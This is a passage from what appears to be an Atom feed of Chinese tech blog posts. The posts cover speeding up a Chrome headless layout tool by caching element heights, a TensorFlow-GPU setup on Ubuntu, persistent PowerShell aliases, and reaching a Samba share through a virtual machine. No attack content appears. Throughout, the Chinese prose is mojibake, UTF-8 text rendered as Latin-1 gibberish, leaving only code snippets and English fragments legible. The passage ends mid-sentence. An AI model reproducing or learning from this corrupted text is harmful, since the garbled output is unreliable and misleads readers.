ä¸€è¾¹æ¸²æŸ“ï¼Œæ¯æ¸²æŸ“ä¸€æ¬¡å°±ä¼š Recalculate Style ä¸€æ¬¡ã€‚è¿™æ„å‘³ç€ï¼šæ¯æ¬¡æ¸²æŸ“ä¸€ä¸ªæ–°çš„åŒºåŸŸæˆ–è¡¨æ ¼ï¼Œéƒ½éœ€è¦åˆ©ç”¨ä¹‹å‰æ‰€æœ‰åŒºåŸŸå’Œè¡¨æ ¼çš„æ•°æ®ï¼ˆå› ä¸ºè¦è¦†ç›–åœ¨å®ƒä»¬ä¸Šé¢ï¼‰ï¼Œæ‰€ä»¥æ¯æ¬¡éœ€è¦è®¡ç®—çš„å…ƒç´ å°±è¶Šæ¥è¶Šå¤šã€‚å­¦è¿‡ç®—æ³•çš„åŒå­¦å¯èƒ½ä¼šæ„è¯†åˆ°ï¼Œè¿™ä¸ªæ–¹æ³•çš„æ—¶é—´å¤æ‚åº¦é«˜è¾¾ <code>O(N^2)</code>ï¼</p><p>èƒ½ä¸èƒ½åª Recalculate Style ä¸€æ¬¡å‘¢ï¼Ÿå¯ä»¥çš„ï¼Œåªéœ€è¦åœ¨ä¸€å¼€å§‹å…ˆå°†æœ€å¤–å±‚å…ƒç´ è®¾ç½®ä¸º <code>display: none</code>ï¼Œè¿™æ ·å¯ä»¥é¿å…æ¯åŠ è½½ä¸€å—å°±æ¸²æŸ“ï¼›ç„¶ååœ¨å…¨éƒ¨åŠ è½½å®Œä¹‹åä¸€ä¸‹å­å…¨éƒ¨æ¸²æŸ“å‡ºæ¥ï¼Œæ€è·¯å¤§æ¦‚æ˜¯è¿™æ ·çš„ï¼š</p><pre><code class="lang-css">/* ä¸è¦ç”¨ *ï¼Œåªè¦éšè—æœ€å¤–å±‚å…ƒç´ å°±è¶³å¤Ÿäº† */
.template {
    display: none;
}</code></pre><pre><code class="lang-javascript">/* åœ¨ body æœ€åçš„ script ä¸­åŠ ä¸Šè¿™æ®µ */
const newStyle = document.createElement('style');
newStyle.innerHTML = '.template{display:initial !important}';
document.body.appendChild(newStyle);</code></pre><p>ä»¥åŠæˆ‘çªç„¶æ„è¯†åˆ°ï¼Œä¹‹å‰çš„ä»£ç åœ¨è·å–å…ƒç´ çš„æ—¶å€™ä½¿ç”¨äº† <code>document.querySelectorAll('tr')</code>ï¼Œè€Œè¿™ä¸ªå‡½æ•°å…¶å®æ˜¯ç›¸å½“æ…¢çš„ã€‚å¦‚æœèƒ½æ”¹ç”¨ <code>firstElementChild</code> å’Œ <code>nextElementSibling</code> åˆ™ä¼šå¿«å¾ˆå¤šï¼Œå› ä¸ºåœ¨ Chrome ä¸­ï¼ŒNode Tree çš„å­˜å‚¨ç»“æ„æ¯”è¾ƒç¥å¥‡ï¼Œæ¯ä¸ªèŠ‚ç‚¹åªæœ‰äº”ä¸ªæŒ‡é’ˆï¼š</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/next-sibling.svg" alt="Node Tree çš„äº”ä¸ªæŒ‡é’ˆ" title="Node Tree çš„äº”ä¸ªæŒ‡é’ˆ"></p><p>æ ¹æ® Chrome æºç çš„ README æ‰€è¿°ï¼š</p><blockquote><p>That means:</p><ul><li>Siblings are stored as a linked list. It takes O(N) to access a parent's n-th child.</li><li>Parent can't tell how many children it has in O(1).</li></ul></blockquote><p>å› æ­¤åˆ«è¯´æ˜¯ <code>node.querySelectorAll</code> äº†ï¼Œå³ä½¿æ˜¯ <code>node.children</code> ä¹Ÿè¦å…ˆèŠ±è´¹ <code>O(N)</code> çš„æ—¶é—´ç”Ÿæˆä¸€ä¸ª JavaScript çš„ç±»æ•°ç»„ï¼Œç„¶åå¾ˆå¯èƒ½é€šè¿‡ <code>Array.from</code> æˆ–è€… <code>...</code> è¿ç®—ç¬¦è½¬æ¢æˆçœŸæ­£çš„æ•°ç»„ï¼Œæœ€åä»ä¸­æ‰¾åˆ°éœ€è¦çš„å…ƒç´ ï¼Œè¿™æ ·ä¼šæ¶ˆè€—å¾ˆå¤šæ—¶é—´ã€‚æ—¢ç„¶æˆ‘èƒ½çŸ¥é“è¡¨æ ¼å…ƒç´ çš„ä½ç½®ï¼Œé‚£ä¹ˆæ¥ä¸‹æ¥çš„å…ƒç´ éƒ½é€šè¿‡ <code>firstElementChild</code> å’Œ <code>nextElementSibling</code> æ¥æ‰¾ï¼Œä¼šæ›´å¿«ä¸€ç‚¹ã€‚</p><p>åšå®Œäº†è¿™äº›ä¿®æ”¹ä¹‹åï¼ŒPerformance å˜æˆäº†è¿™æ ·ï¼š</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/2.png" alt="ç»è¿‡ä¼˜åŒ–ä¹‹åçš„æ€§èƒ½" title="ç»è¿‡ä¼˜åŒ–ä¹‹åçš„æ€§èƒ½"></p><p>å¯ä»¥å‘ç°ï¼Œä¸€å¼€å§‹ 40 s çš„æ¸²æŸ“æ—¶é—´å‡å°‘åˆ°äº† 3 sï¼Œå¹¶ä¸”åé¢çš„æ’ç‰ˆä»£ç è¿è¡Œé€Ÿåº¦ä¹Ÿå¿«äº† 8 s å·¦å³ã€‚</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/laser_pointer_more_power.png" alt="èƒ½ä¸èƒ½å†ç»™åŠ›ä¸€ç‚¹å‘¢ï¼Ÿ" title="èƒ½ä¸èƒ½å†ç»™åŠ›ä¸€ç‚¹å‘¢ï¼Ÿ"></p><h2>æè‡´çš„ä¼˜åŒ–</h2><p>ä¹‹å‰æˆ‘æœ¬æ¥å·²ç»æƒ³ä¸åˆ°ç»§ç»­ä¼˜åŒ–çš„åŠæ³•äº†ï¼Œå› ä¸ºæˆ‘çœ‹äº†ä¸€ä¸‹ Sources ä¸­æ¯è¡Œä»£ç å¯¹åº”çš„æ—¶é—´ï¼Œå‘ç°å¤§å¤´åœ¨è¿™é‡Œï¼š</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/3.png" alt="æ­¤æ—¶æ¶ˆè€—æœ€å¤šæ—¶é—´çš„ä»£ç " title="æ­¤æ—¶æ¶ˆè€—æœ€å¤šæ—¶é—´çš„ä»£ç "></p><p>æ¯æ¬¡è·å– <code>tr.offsetHeight</code> æ—¶éƒ½éœ€è¦è¿›è¡Œä¸€é Layout æ“ä½œï¼Œè€Œä¸”è¿˜æ˜¯ Forced reflowï¼Œä½†æ˜¯æˆ‘åˆå¿…é¡»è¦è·å–è¡¨æ ¼æ¯ä¸€è¡Œçš„é«˜åº¦ï¼Œå› ä¸ºè¡¨æ ¼ä¸­çš„æ•°æ®å¯èƒ½ä¼šæœ‰æ¢è¡Œï¼Œæ¯è¡Œçš„é«˜åº¦æ˜¯ä¸ç¡®å®šçš„ã€‚</p><p>ä½†æ˜¯åœ¨å†™è¿™ç¯‡æ–‡ç« ä¹‹å‰ï¼Œæˆ‘çªç„¶åˆæ„è¯†åˆ°ï¼šåªè¦èƒ½ä¿è¯ç»™æ¯ä¸ªè¡¨æ ¼è®¾ç½®å¥½ <code>&lt;col&gt;</code> çš„å®½åº¦ï¼Œé‚£ä¹ˆè¿™ä¸€è¡Œä¸ç®¡è¢«æ’åˆ°å“ªä¸ªè¡¨æ ¼å—ä¸­ï¼Œé«˜åº¦éƒ½æ˜¯ä¸å˜çš„ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ‰€æœ‰å…ƒç´ çš„é«˜åº¦ï¼Œåœ¨æ¸²æŸ“ä¹‹åæ’ç‰ˆä¹‹å‰ï¼Œå°±å·²ç»å®Œå…¨ç¡®å®šä¸‹æ¥äº†ï¼é‚£ä¹ˆæˆ‘å®Œå…¨å¯ä»¥åœ¨æ’ç‰ˆçš„ä¸€å¼€å§‹ï¼Œå°†æ‰€æœ‰å¿…è¦å…ƒç´ çš„ <code>offsetHeight</code> ä¿å­˜åœ¨ä¸€ä¸ª <code>Map</code> ä¸­ï¼Œä¹‹åç›´æ¥è°ƒç”¨å°±å¯ä»¥äº†ã€‚</p><p>åœ¨ä¼˜åŒ–å‰ï¼Œè·å–é«˜åº¦çš„æ—¶æœºæ˜¯åœ¨æ’ç‰ˆæ—¶ï¼Œè¿™æ„å‘³ç€æ¯æ¬¡ä¿®æ”¹äº† DOM ç»“æ„åï¼Œå†åœ¨ä¸‹ä¸€è½®å¾ªç¯ä¸­è·å–å¦ä¸€ä¸ªå…ƒç´ çš„é«˜åº¦ï¼Œå› æ­¤æ¯æ¬¡è·å–éƒ½ä¼šæœ‰ Layoutï¼›ä¼˜åŒ–åï¼Œè·å–é«˜åº¦çš„æ—¶æœºæ˜¯åœ¨æ’ç‰ˆä¹‹å‰ï¼Œè€Œæ’ç‰ˆæ—¶åªä¼šè·å–å…ƒç´ é«˜åº¦ï¼Œä¸ä¼šä¿®æ”¹æ ·å¼å’Œ DOM ç»“æ„ï¼Œå› æ­¤åªä¼š Layout ä¸€æ¬¡ã€‚</p><p>æ€è·¯å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p><pre><code class="lang-javascript">const trHeights = new Map();
const headAreaHeights = new Map();
const tailAreaHeights = new Map();
const theadHeights = new Map();
const tbodyHeights = new Map();
Array.from(document.querySelectorAll('tbody &gt; tr')).forEach(el =&gt; {
    trHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('.__area_head')).forEach(el =&gt; {
    headAreaHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('.__area_tail')).forEach(el =&gt; {
    tailAreaHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('thead')).forEach(el =&gt; {
    theadHeights.set(el, el.offsetHeight);
});
Array.from(document.querySelectorAll('tbody')).forEach(el =&gt; {
    tbodyHeights.set(el, el.offsetHeight);
});</code></pre><p>è¿™æ®µä»£ç æ˜¯ä¸€æ¬¡æ€§æ‰§è¡Œçš„ï¼Œå› æ­¤å¯¹æ•ˆç‡çš„å½±å“å¯ä»¥å¿½ç•¥ã€‚æ¥ä¸‹æ¥æŠŠåé¢çš„ <code>offsetHeight</code> éƒ½æ›¿æ¢æˆè¿™æ ·ï¼š</p><pre><code class="lang-javascript">trs.forEach((tr, index) =&gt; {
    // const rowHeight = tr.offsetHeight;
    const rowHeight = trHeights.get(tr);

    /* other codes */
});</code></pre><p>çœ‹ä¸€ä¸‹ Performanceï¼Œæ˜¯è¿™æ ·çš„ï¼š</p><p><img src="https://static.rexskz.info/blog/article/awb-tool-ultimate-optimization-for-chrome-headless/4.png" alt="ä¼˜åŒ–äº† Layout åçš„æ€§èƒ½" title="ä¼˜åŒ–äº† Layout åçš„æ€§èƒ½"></p><p>è¿™æ•ˆæœä¹Ÿå¤ªå¥½äº†å§ï¼åˆ†æä¸€ä¸‹è¿™ä¸ªå›¾çš„å«ä¹‰ï¼š</p><ul><li>0 ms ~ 400 ms æ˜¯åœ¨åŠ è½½é¡µé¢ï¼Œè¿™ä¸ªç†è®ºä¸Šæ˜¯æ²¡æ³•å†ä¼˜åŒ–çš„ï¼›</li><li>400 ms ~ 2300 ms æ˜¯ä¸€å¼€å§‹å°†æ‰€æœ‰å…ƒç´ æ˜¾ç¤ºå‡ºæ¥ï¼Œäºæ˜¯ Chrome åšäº†ä¸€é Layoutï¼›</li><li>2300 ms ~ 2500 ms æ˜¯æˆ‘çš„æ’ç‰ˆä»£ç ï¼Œæ­¤æ—¶ç”±äºæ²¡æœ‰ä»»ä½•è·å–æ ·å¼çš„æ“ä½œï¼Œæµè§ˆå™¨ä¼šå°†æ‰€æœ‰çš„æ ·å¼è®¡ç®—é›†ä¸­åˆ°ä¸‹ä¸€ä¸ªäº‹ä»¶å¾ªç¯ä¸­ç»Ÿä¸€å¤„ç†ï¼›</li><li>2500 ms ~ 4900 ms æ˜¯ç»Ÿä¸€å¤„ç†çš„æ ·å¼è®¡ç®—ï¼Œè¿™éœ€è¦ä¸€æ¬¡ Layoutã€‚</li></ul><p>ç†è®ºä¸Šè®²ï¼ŒLayout çš„æ¬¡æ•°å·²ç»ä¸å¯èƒ½å†å°‘äº†ï¼Œä¸¤æ¬¡ Layout çš„æ—¶é—´å–å†³äºé¢å•çš„å¤æ‚ç¨‹åº¦ï¼Œå¯èƒ½å¯ä»¥é€šè¿‡ä¼˜åŒ– CSS çš„æ–¹å¼æ¥æé€Ÿï¼Œä½†ä¸ç¡®å®šæ•ˆæœå¦‚ä½•ï¼ˆæ¯•ç«Ÿç°åœ¨å¹³å‡æ¯ä¸ªå…ƒç´ åªæœ‰ä¸åˆ° 0.5 ms çš„ç»˜åˆ¶æ—¶é—´ï¼‰ã€‚å› æ­¤æˆ‘è§‰å¾—ï¼Œè¿™å¯ä»¥ç®—æ˜¯éå¸¸æè‡´çš„ä¼˜åŒ–äº†ã€‚</p><h1>å‚è€ƒèµ„æ–™ï¼ˆéƒ¨åˆ†å›¾æºï¼‰</h1><ul><li><a href="https://chromium.googlesource.com/chromium/src/+/master/third_party/blink/renderer/core/dom/README.md">DOM - Chromium Source Code README</a></li><li><a href="https://what-if.xkcd.com/13/">Laser Pointer - What If - xkcd</a></li></ul>]]></content>
        <author>
            <name><![CDATA[RÂ·ex / Zeng]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/</id>
        <title><![CDATA[Ubuntu16.04é…ç½®TensorFlow-vGPUç¯å¢ƒ]]></title>
        <updated>2020-04-29T18:07:07+08:00</updated>
        <link href="https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/"/>
        <content type="text/html" src="https://miaotony.xyz/2020/04/29/Server_TensorFlow-vGPU/"><![CDATA[æŠ˜è…¾äº†ä¸€ä¸ªä¸‹åˆï¼Œç»ˆäºåœ¨Ubuntu 16.04ç³»ç»Ÿä¸Šé…ç½®å¥½äº†TensorFlowçš„vGPUç¯å¢ƒï¼Œä¸»è¦æ¶‰åŠæ˜¾å¡é©±åŠ¨ã€CUDAã€Anacondaã€Tensorflow-gpuå®‰è£…ç­‰ï¼Œè¿™é‡Œæ¥åšä¸€ä¸‹ç¬”è®°å–µã€‚]]></content>
        <author>
            <name><![CDATA[MiaoTony]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/</id>
        <title><![CDATA[ä¸º Windows PowerShell è®¾ç½® User Alias ï¼ˆå‘½ä»¤åˆ«åï¼‰]]></title>
        <updated>2020-04-28T09:16:41+08:00</updated>
        <link href="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"/>
        <content type="text/html" src="https://blog.vvzero.com/2019/07/22/set-user-alias-for-windows-PowerShell/"><![CDATA[<blockquote><p>ç›´æ¥çœ‹æ­¥éª¤çš„è¯ï¼Œåœ¨æœ€ä¸‹æ–¹ã€‚</p></blockquote><h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>Windows Terminal è™½ç„¶è¿˜å¤„äºé¢„è§ˆé˜¶æ®µï¼Œä½†æ˜¯ä¹Ÿå‡ºæ¥å¾ˆé•¿ä¸€æ®µæ—¶é—´äº†ã€‚å®ƒçš„å†å²ä½¿å‘½ï¼Œä¹Ÿè®¸å°±æ˜¯è®©åŸç”Ÿ Windows ä¹Ÿèƒ½æœ‰ä¸€ä¸ªåƒæ ·çš„å‘½ä»¤è¡Œç¯å¢ƒã€‚ä»¥å‰æˆ‘ä¸€ç›´åœ¨ç”¨ Cmderï¼Œä½†æ˜¯ Cmder çš„å¯åŠ¨é€Ÿåº¦ç¡®å®ä¸æ•¢æ­ç»´ï¼Œè€Œ Windows Terminal å¯åŠ¨ç¡®å®å¾ˆå¿«ã€‚ç›¸æ¯” Cmderï¼Œ Windows Terminal è¿˜ç¼ºå°‘å¾ˆå¤šåŠŸèƒ½ï¼Œä¸è¿‡ä»¥ååº”è¯¥å¾ˆå¿«ä¹Ÿä¼šè¡¥ä¸Šã€‚</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29b3f1.png" style="zoom:50%;"></p><p>æˆ‘æƒ³å°è¯•ä½¿ç”¨ Windows Termimal è¿›è¡Œå¼€å‘ã€‚Windows Terminal é»˜è®¤å¯ä»¥ä½¿ç”¨ <code>PowerShell</code>ã€<code>cmd</code>ã€<code>wsl bash</code>ä½œä¸ºè„šæœ¬å·¥å…·ã€‚æ—¢ç„¶æ˜¯åœ¨ Windows ç¯å¢ƒä¸‹å˜›ï¼Œè¿˜æ˜¯å¾—å°Šæ•¬ä¸€ä¸‹ Windows PoweShell çš„ã€‚åˆæ¬¡ä½¿ç”¨ï¼Œæˆ‘è§‰å¾— PowerShell è·Ÿ Cmder ç”¨èµ·æ¥ï¼Œæœ€ä¸æ–¹ä¾¿çš„ä¸€ç‚¹å°±æ˜¯ï¼Œæˆ‘åœ¨ Cmder é‡Œé¢è®¾äº†å¾ˆå¤šçš„ Aliasï¼Œä¹Ÿå°±æ˜¯é€šè¿‡ä¿®æ”¹ <code>config/user_aliases.cmd</code> å†™ä¸€ä¸² <code>&lt;alia&gt;=&lt;xxx&gt; &lt;xxx&gt;</code> æ¥å®ç°çš„ã€‚</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29ad52.png" style="zoom:50%;"></p><p>ä½†æ˜¯ï¼ŒPowerShell å¦‚ä½•å®ç°å‘½ä»¤çš„åˆ«åè®¾ç½®å‘¢ï¼Ÿ</p><h2 id="æ¢ç´¢è¿‡ç¨‹åŠåŸç†æ¦‚è¿°"><a href="#æ¢ç´¢è¿‡ç¨‹åŠåŸç†æ¦‚è¿°" class="headerlink" title="æ¢ç´¢è¿‡ç¨‹åŠåŸç†æ¦‚è¿°"></a>æ¢ç´¢è¿‡ç¨‹åŠåŸç†æ¦‚è¿°</h2><p>å¦‚æœæœç´¢å…³é”®è¯ <code>windows powershell set user alias</code>ï¼Œé€šå¸¸è°·æ­Œä¼šç»™å‡º<a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/set-alias?view=powershell-6" target="_blank" rel="noopener">å¾®è½¯å®˜æ–¹æ–‡æ¡£</a>ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡æ¡£åªæ˜¯å‘Šè¯‰æˆ‘ä»¬å¦‚ä½•åœ¨è„šæœ¬é‡Œé¢è®¾ç½®ä¸´æ—¶çš„åˆ«åï¼Œå¦‚æœè¦è®¾ç½®æ°¸ä¹…åˆ«åï¼Œè¯¥æ€ä¹ˆåŠï¼Ÿå®é™…ä¸Šï¼Œâ€œåˆ«åâ€è¿™ç§ä¸œè¥¿ï¼Œä¹Ÿå°±æ˜¯ <code>alias</code>ï¼Œå‡ ä¹æ‰€æœ‰çš„è„šæœ¬è¯­è¨€ï¼Œéƒ½æ²¡æœ‰æ‰€è°“çš„â€œæ°¸ä¹…åˆ«åâ€(Permanent alias)ï¼Œæˆ‘ä»¬ä½¿ç”¨ Linux bash ã€Cmder ä¹‹ç±»çš„è„šæœ¬å·¥å…·ï¼Œæ‰“å¼€ç»ˆç«¯æ—¶ï¼Œç³»ç»Ÿä¼šé»˜è®¤æ‰§è¡Œä¸€ä¸ªè„šæœ¬æ–‡ä»¶ï¼ˆ bash æ˜¯ç”¨æˆ·ç›®å½•ä¸‹çš„ <code>.bashrc</code>ï¼ŒCmder æ˜¯ <code>config/user_aliases.cmd</code> ï¼‰ï¼Œè€Œè¿™æ ·çš„è„šæœ¬æ–‡ä»¶é‡Œï¼Œå°±åŒ…å«äº†åˆ«åçš„å®šä¹‰ã€‚è¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆï¼Œæˆ‘ä»¬åœ¨ Linux ç±»ç³»ç»Ÿä¸­ï¼Œä¿®æ”¹ <code>.bashrc</code> åï¼Œå¿…é¡»è¦é‡æ–°ç™»å‡ºç™»å½•ã€æˆ–è€… <code>source .bashrc</code> çš„åŸå› äº†ã€‚</p><p>æ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦ä¿®æ”¹ Windows Powershell å¯åŠ¨æ—¶æ‰§è¡Œçš„æ–‡ä»¶å°±è¡Œäº†ã€‚å¾ˆå¤šè®ºå›é‡Œé¢è¯´ï¼Œé»˜è®¤æ‰§è¡Œçš„è„šæœ¬æ˜¯ <code>$Home\Documents\profile.ps1</code> ï¼Œä¹Ÿå°±æ˜¯ <code>C:\Users\ä½ çš„ç”¨æˆ·å\Documents\profile.ps1</code> ï¼Œä½†æ˜¯è¿™å¹¶ä¸æ­£ç¡®ï¼Œæœ€å¥½çš„æ–¹å¼æ˜¯ï¼Œå…ˆå¯åŠ¨ PowerShell ï¼Œå†æ‰§è¡Œ <code>echo $profile</code>ï¼Œè¿™æ ·å¾—åˆ°çš„æ–‡ä»¶è·¯å¾„ï¼Œæ‰æ˜¯ PowerShell çš„é»˜è®¤æ‰§è¡Œæ–‡ä»¶è·¯å¾„ã€‚</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef29d447.png" alt></p><p>ç„¶åï¼Œåˆ›å»ºè¿™ä¸ªæ–‡ä»¶å°±å¥½å•¦ã€‚</p><p>åœ¨æ–‡ä»¶é‡Œé¢ï¼Œå†™ä¸Šåˆ«åè®¾ç½®çš„è¯­å¥ã€‚å†ä¸€æ¬¡æ³¨æ„ï¼Œå‡å¦‚ä½ çš„åˆ«åæŒ‡ä»£çš„å‘½ä»¤å«æœ‰ç©ºæ ¼ï¼Œå°±ä¸å¯ä»¥ä½¿ç”¨ <code>New-Alias</code> å‘½ä»¤ï¼Œå› ä¸ºå®ƒä¸èƒ½å¸¦ç©ºæ ¼ï¼Œå³ä½¿ä½ æŠŠæŒ‡ä»£çš„å‘½ä»¤ç”¨å¼•å·æ‹¬èµ·æ¥ä¹Ÿæ²¡ç”¨ã€‚é‚£æ€ä¹ˆåŠå‘¢ï¼Ÿç»§ç»­è°·æ­Œï¼ŒåŸæ¥ï¼Œæ­£ç¡®å§¿åŠ¿æ˜¯ç”¨ <code>function</code> ï¼Œä¹Ÿå°±æ˜¯ï¼Œæˆ‘ä»¬æŠŠè‡ªå·±è¦å®šä¹‰çš„æŒ‡ä»¤ï¼Œå®šä¹‰ä¸ºä¸€ä¸ªå‡½æ•°ï¼Œå°±è¡Œå•¦ã€‚</p><p><img src="https://img.vvzero.com/ih/2019/07/22/5d35bef339443.png" style="zoom: 67%;"></p><p>ä¿å­˜æ–‡ä»¶ï¼Œé‡æ–°å¯åŠ¨ PowerShell ä»¥åï¼Œä¸å‡ºæ„å¤–ï¼Œåº”è¯¥ä¼šæŠ¥ä¸€ä¸ª <code>File xxxxxxx\Microsoft.PowerShell_profile.ps1 cannot be loaded because running scripts is disabled on this system.</code> æ ¹æ®<a href="https://tecadmin.net/powershell-running-scripts-is-disabled-system/" target="_blank" rel="noopener">æ­¤é“¾æ¥</a>ï¼Œå‡ºç°è¿™ç§æƒ…å†µï¼Œæ˜¯å› ä¸º Windows ç³»ç»Ÿä¸ºäº†é˜²æ­¢æ¶æ„è„šæœ¬è‡ªåŠ¨æ‰§è¡Œï¼Œæ•…é»˜è®¤ä¸å…è®¸è‡ªåŠ¨è¿è¡Œè„šæœ¬ã€‚æ‰€ä»¥ï¼Œåœ¨ç¡®å®šè‡ªå·±æœ‰èƒ½åŠ›æŠŠæ§çš„æƒ…å†µä¸‹ï¼Œ<strong>ä»¥ç®¡ç†å‘˜èº«ä»½</strong>ï¼Œåœ¨ PowerShell ä¸­æ‰§è¡Œ <code>Set-ExecutionPolicy RemoteSigned</code>ï¼Œå³å¯ã€‚</p><p>å†æ¬¡é‡å¯ PowerShellï¼Œåº”è¯¥å¯ä»¥å‘ç°ï¼Œè‡ªå®šä¹‰åˆ«åå·²ç»ç”Ÿæ•ˆäº†ã€‚</p><h2 id="æ­¥éª¤æ•´ç†"><a href="#æ­¥éª¤æ•´ç†" class="headerlink" title="æ­¥éª¤æ•´ç†"></a>æ­¥éª¤æ•´ç†</h2><p>å¦‚æœä½ æƒ³ä¸ºè‡ªå·±çš„ Windows PowerShell è®¾ç½®æ°¸ä¹…çš„å‘½ä»¤åˆ«å (Alias)ï¼Œå¯ä»¥éµå¾ªä»¥ä¸‹æ­¥éª¤ï¼š</p><ol><li><p>æ‰“å¼€ PowerShell ï¼Œè¿è¡Œ <code>echo $profile</code>ï¼Œä¼šè¾“å‡ºä¸€ä¸ªæ–‡ä»¶è·¯å¾„ã€‚åˆ›å»ºè¿™ä¸ªæ–‡ä»¶ã€‚</p></li><li><p>æ‰“å¼€åˆšåˆ›å»ºçš„æ–‡ä»¶ï¼ŒæŒ‰ä»¥ä¸‹æ ¼å¼è®¾ç½®å¤šæ¡åˆ«åï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> åˆ«å &#123; éœ€è¦æ›¿ä»£çš„å‘½ä»¤ï¼Œå¯ä»¥åŒ…å«ç©ºæ ¼ &#125;</span><br></pre></td></tr></table></figure></li><li><p>ä»¥ç®¡ç†å‘˜èº«ä»½æ‰“å¼€ PowerShellï¼Œæ‰§è¡Œ <code>Set-ExecutionPolicy RemoteSigned</code>ã€‚</p></li><li><p>é‡æ–°å¯åŠ¨ PowerShell ï¼Œåº”è¯¥å·²ç»å®Œæˆäº†ã€‚</p></li></ol>]]></content>
        <author>
            <name><![CDATA[VVBLOG]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/</id>
        <title><![CDATA[ä½¿ç”¨è™šæ‹Ÿæœºç»•è¿‡ Windows Samba å®¢æˆ·ç«¯ç«¯å£é™åˆ¶]]></title>
        <updated>2020-04-28T06:19:26+08:00</updated>
        <link href="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"/>
        <content type="text/html" src="https://blog.vvzero.com/2020/04/28/use-virtual-machine-to-bypass-windows-samba-port-limit/"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>è¿«äºä¸èƒ½æµªè´¹å®¿èˆè”é€šå®½å¸¦çš„å…¬ç½‘ IPï¼Œæˆ‘ç”¨æ ‘è“æ´¾æ­å»ºäº†ä¸€ä¸ª NASï¼Œä½¿ç”¨ Samba æä¾›è®¿é—®ã€‚ä½†æ˜¯ï¼Œç”±äºè¿è¥å•†é™åˆ¶ï¼Œå…¥ç«™å’Œå‡ºç«™çš„ 139ã€445 ç«¯å£éƒ½è¢«å°ç¦ï¼ˆå¯¹ï¼ä½ ä¸èƒ½è®¿é—®å…¶ä»–æœºå™¨çš„ 445 ç«¯å£ï¼ï¼‰ï¼Œè¿™æ ·åšåªèƒ½è®©åŒä¸€ä¸ªå±€åŸŸç½‘çš„æœåŠ¡è®¿é—®ã€‚æˆ‘å°è¯•ä¿®æ”¹äº†ç«¯å£å·ï¼ŒæŠŠæœ¬åœ°çš„ 445 ç«¯å£æ˜ å°„åˆ°å…¬ç½‘çš„å…¶å®ƒç«¯å£ï¼Œç®—æ˜¯å¯ä»¥ç»™å¤§éƒ¨åˆ† Samba å®¢æˆ·ç«¯ä½¿ç”¨äº†ï¼ˆæ¯”å¦‚å®‰å“æ‰‹æœºï¼‰ã€‚ä½†æ˜¯ï¼ŒWindows çš„ Samba å®¢æˆ·ç«¯ï¼Œå¹¶ä¸æ”¯æŒè®¾ç½®ç«¯å£å·ï¼ˆå¦‚æœåœ¨æ–‡ä»¶ç®¡ç†å™¨åœ°å€æ è¾“å…¥ <code>\\a.b.c.d:xxx</code> å°†ä¼šè¢«è®¤ä¸ºæ˜¯ WebDAV åè®®ï¼‰ã€‚</p><p>ç½‘ä¸ŠæŸäº›æ•™ç¨‹è¯´ï¼Œåœ¨ Windows æœ¬åœ°è®¾ç½®ç«¯å£è½¬å‘ï¼ŒæŠŠè®¿é—®æœ¬æœº 445 ç«¯å£çš„æµé‡è½¬å‘è‡³ä½ çš„ Samba æœåŠ¡å™¨ç«¯å£ã€‚ä½†æ˜¯ï¼Œè¿™æ ·åšéœ€è¦å…³é—­ Windows è‡ªå·±çš„ Samba æœåŠ¡å™¨ï¼Œä¼šå¯¼è‡´ç½‘ç»œå…±äº«ã€ç½‘ç»œæ‰“å°æœºç­‰å¾ˆå¤šåŠŸèƒ½æ— æ³•ä½¿ç”¨ï¼Œå¯¼è‡´è«åå…¶å¦™çš„é—®é¢˜ï¼Œæ‰€ä»¥ä¸æ¨èã€‚</p><p>ä½†æ˜¯å¯ä»¥æ¢ä¸ªæ€è·¯ã€‚</p><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>æ—¢ç„¶ä¸èƒ½ä½¿ç”¨æœ¬æœºï¼ˆ127.0.0.1ï¼‰åšè½¬å‘ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆä¸ä½¿ç”¨æœ¬åœ°ç½‘ç»œä¸­å…¶ä»–çš„æœºå™¨è¿›è¡Œæ•°æ®è½¬å‘å‘¢ï¼Ÿä¸€å¼€å§‹æˆ‘æƒ³åœ¨æœ¬åœ°ç½‘ç»œä¸­åŠ ä¸€ä¸ªæ ‘è“æ´¾ä¹‹ç±»çš„å°ä¸»æœºï¼Œä½†è§‰å¾—è¿™æ ·å¤ªç´¯èµ˜äº†ã€‚è™šæ‹Ÿæœºä¹Ÿæ˜¯ç‹¬ç«‹çš„æœºå™¨ï¼Œæˆ‘è§‰å¾—ä¸€æ 